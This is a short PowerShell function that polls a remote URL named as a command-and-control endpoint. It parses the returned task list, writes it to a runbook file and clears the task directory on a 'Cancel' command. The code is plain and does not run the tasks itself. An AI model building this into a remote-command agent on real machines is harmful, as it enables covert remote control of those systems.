$script:name=($MyInvocation.MyCommand.Name).Trim('.ps1')

function CheckWebTasks() {
	if (!(test-path $TaskDir)) {mkdir $TaskDir}
	#Check for published tasks
	$WebCommand=(Invoke-WebRequest -Method POST -Headers $head -URI $CnCURI -UseBasicParsing).content

	#Check for JSON format
	if ($WebCommand -match '{"') {
		$CmdList0=($WebCommand | convertfrom-json).psobject.properties | select name,value 
		foreach ($line in $CmdList0) {$CmdList=$line.name, $line.value }
		$CmdList=$CmdList.split(';')
		} ELSE {
			#Non-JSON
			$CmdList=$WebCommand.split(';').trim()
			}

	#Create task runbook
	if ($CmdList[0] -eq 'Cancel') {
		Remove-Item "$TaskDir\*.*" -force -verbose
		}
	if ($CmdList) {$CmdList | out-file $runbook}
	$hash=(Get-FileHash -Algorithm sha1 $runbook).hash
	return $hash
}

write-host "$name loaded..." -ForegroundColor yellow -BackgroundColor black
